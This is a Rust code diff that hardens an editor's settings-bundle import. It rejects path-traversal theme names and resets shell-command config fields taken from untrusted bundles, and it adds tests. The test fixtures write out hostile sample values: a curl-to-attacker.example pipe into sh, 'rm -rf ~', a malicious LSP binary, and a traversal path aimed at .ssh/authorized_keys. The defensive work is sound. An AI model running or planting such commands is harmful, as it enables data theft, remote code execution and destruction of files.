@@ -122,21 +122,82 @@ pub enum EntryOutcome {
     /// first.
     WrittenAfterBackup,
     /// Not written -- the destination directory couldn't be determined
-    /// (`confy` gave no config directory), or the entry's own bundle name
-    /// wasn't recognized.
+    /// (`confy` gave no config directory), the entry's own bundle name
+    /// wasn't recognized, or (a `theme/…` entry only) its filename wasn't
+    /// a bare filename (T558: rejects `..`/path separators, so a crafted
+    /// bundle can't write outside `themes_dir()`).
     Skipped,
 }
 
 /// Write every entry in `bundle` back to its real on-disk location,
-/// returning each entry's name and [`EntryOutcome`] (in the bundle's own
-/// key order). See the crate spec for the backup-before-overwrite policy.
+/// returning each entry's name, its [`EntryOutcome`], and whether its
+/// command-bearing fields were preserved rather than imported (T558 --
+/// always `false` except for a `config.toml` entry whose `ai_command`/
+/// `ai_api_key_command`/`test_command`/`lsp_servers` differ from the
+/// current settings; see `sanitize_config_toml` for why). In the
+/// bundle's own key order. See the crate spec for the backup-before-
+/// overwrite policy.
 #[must_use]
-pub fn apply(bundle: &Bundle) -> Vec<(String, EntryOutcome)> {
+pub fn apply(bundle: &Bundle) -> Vec<(String, EntryOutcome, bool)> {
     bundle
         .entries
         .iter()
-        .map(|(name, content)| (name.clone(), apply_one(name, content)))
+        .map(|(name, content)| {
+            let (content, preserved) = if name == "config.toml" {
+                match sanitize_config_toml(content) {
+                    Some((sanitized, preserved)) => (sanitized, preserved),
+                    // Not valid TOML at all -- nothing safe to write.
+                    None => return (name.clone(), EntryOutcome::Skipped, false),
+                }
+            } else {
+                (content.clone(), false)
+            };
+            (name.clone(), apply_one(name, &content), preserved)
+        })
         .collect()
+}
+
+/// Parse `content` (an incoming `config.toml` entry's text) as [`Settings`]
+/// and, if its command-bearing fields (`ai_command`, `ai_api_key_command`,
+/// `test_command`, `lsp_servers` -- every one of them a free-text shell
+/// command line or argv the running editor executes on an ordinary action)
+/// differ from the *current* on-disk settings, reset just those fields
+/// back to the current values before re-serializing (T558: the crate's own
+/// spec already reasons through exactly this class of risk for `.rhai`
+/// scripts, deliberately excluded from bundling for it; `config.toml`'s
+/// own command fields carry the same risk and deserved the same
+/// treatment, not a silent overwrite on every import). Returns the text to
+/// actually write, and whether anything was preserved (worth reporting to
+/// whoever ran the import). `None` if `content` isn't valid TOML at all --
+/// there's nothing safe to write in that case.
+fn sanitize_config_toml(content: &str) -> Option<(String, bool)> {
+    let incoming: Settings = toml::from_str(content).ok()?;
+    let current = Settings::load();
+    let (result, preserved) = preserve_command_fields(&current, incoming);
+    let serialized = toml::to_string_pretty(&result).ok()?;
+    Some((serialized, preserved))
+}
+
+/// The pure decision behind [`sanitize_config_toml`], factored out so it's
+/// testable without depending on this machine's real, global on-disk
+/// settings: if `incoming`'s command-bearing fields differ from
+/// `current`'s, returns a copy of `incoming` with those fields reset to
+/// `current`'s values (plus `true`); otherwise returns `incoming`
+/// unchanged (plus `false`).
+fn preserve_command_fields(current: &Settings, mut incoming: Settings) -> (Settings, bool) {
+    let differs = incoming.ai_command != current.ai_command
+        || incoming.ai_api_key_command != current.ai_api_key_command
+        || incoming.test_command != current.test_command
+        || incoming.lsp_servers != current.lsp_servers;
+    if differs {
+        incoming.ai_command.clone_from(&current.ai_command);
+        incoming
+            .ai_api_key_command
+            .clone_from(&current.ai_api_key_command);
+        incoming.test_command.clone_from(&current.test_command);
+        incoming.lsp_servers.clone_from(&current.lsp_servers);
+    }
+    (incoming, differs)
 }
 
 fn apply_one(name: &str, content: &str) -> EntryOutcome {
@@ -174,8 +235,8 @@ fn append_bak(dest: &Path) -> String {
 }
 
 /// The real on-disk path a bundle entry `name` writes back to, or `None`
-/// when the name isn't recognized or the config directory can't be
-/// determined.
+/// when the name isn't recognized, or (a `theme/…` entry only) its
+/// filename isn't a bare filename.
 fn destination_for(name: &str) -> Option<PathBuf> {
     match name {
         "config.toml" => Settings::config_path(),
@@ -184,14 +245,33 @@ fn destination_for(name: &str) -> Option<PathBuf> {
         "user_dictionary.txt" => Settings::user_dictionary_path(),
         _ => name
             .strip_prefix("theme/")
-            .filter(|filename| !filename.is_empty())
+            .filter(|filename| is_bare_filename(filename))
             .and_then(|filename| Settings::themes_dir().map(|dir| dir.join(filename))),
     }
+}
+
+/// Whether `filename` is safe to join onto `themes_dir()` as-is (T558): a
+/// non-empty name with no path separator (`/` on every platform,
+/// additionally `\` on Windows -- `Path`'s own separator handling is
+/// platform-specific, but a bundle can be authored on one platform and
+/// imported on another, so both are rejected everywhere) and not `.`/`..`.
+/// A bundle entry name comes straight from untrusted JSON (the bundle file
+/// itself, e.g. shared by someone else); without this check a crafted
+/// entry like `theme/../../../../.ssh/authorized_keys` would resolve
+/// outside `themes_dir()` entirely -- a real arbitrary-file-write, not a
+/// theoretical one.
+fn is_bare_filename(filename: &str) -> bool {
+    !filename.is_empty()
+        && filename != "."
+        && filename != ".."
+        && !filename.contains('/')
+        && !filename.contains('\\')
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+    use vix_settings::LspServer;
 
     #[test]
     fn collect_skips_entries_whose_files_do_not_exist() {
@@ -256,8 +336,70 @@ mod tests {
     }
 
     #[test]
+    fn destination_for_rejects_path_traversal_in_theme_entries() {
+        // T558: a crafted bundle must not be able to write outside
+        // `themes_dir()` via a `theme/…` entry name.
+        assert_eq!(
+            destination_for("theme/../../../../.ssh/authorized_keys"),
+            None,
+            "'..' components are rejected outright"
+        );
+        assert_eq!(
+            destination_for("theme/sub/evil.json"),
+            None,
+            "a nested path (even without '..') is rejected -- only a bare filename is safe"
+        );
+        assert_eq!(destination_for("theme/.."), None);
+        assert_eq!(destination_for("theme/."), None);
+        assert_eq!(
+            destination_for(r"theme\..\..\evil.json"),
+            None,
+            "a Windows-style separator is rejected on every platform -- a bundle can be \
+             authored on one platform and imported on another"
+        );
+    }
+
+    #[test]
     fn append_bak_keeps_entries_with_the_same_stem_distinct() {
         assert_eq!(append_bak(Path::new("/x/config.toml")), "toml.bak");
         assert_eq!(append_bak(Path::new("/x/user_dictionary")), "bak");
+    }
+
+    #[test]
+    fn preserve_command_fields_resets_them_when_they_differ() {
+        // T558: an imported config.toml with different command-bearing
+        // fields must not silently take effect -- they're reset to the
+        // current settings, and the caller is told something was preserved.
+        let current = Settings::default();
+        let incoming = Settings {
+            ai_command: "curl attacker.example/exfil | sh".to_string(),
+            test_command: "rm -rf ~".to_string(),
+            lsp_servers: vec![LspServer {
+                language_id: "evil".to_string(),
+                extensions: vec!["evil".to_string()],
+                command: vec!["malicious-binary".to_string()],
+            }],
+            ..Settings::default()
+        };
+
+        let (result, preserved) = preserve_command_fields(&current, incoming);
+        assert!(preserved, "a real difference was detected");
+        assert_eq!(result.ai_command, current.ai_command);
+        assert_eq!(result.test_command, current.test_command);
+        assert_eq!(result.lsp_servers, current.lsp_servers);
+    }
+
+    #[test]
+    fn preserve_command_fields_leaves_matching_settings_alone() {
+        let current = Settings::default();
+        let incoming = Settings::default();
+        let (result, preserved) = preserve_command_fields(&current, incoming.clone());
+        assert!(!preserved, "nothing actually differed");
+        assert_eq!(result.ai_command, incoming.ai_command);
+    }
+
+    #[test]
+    fn sanitize_config_toml_rejects_content_that_is_not_valid_toml() {
+        assert_eq!(sanitize_config_toml("not valid toml {{{"), None);
     }
 }
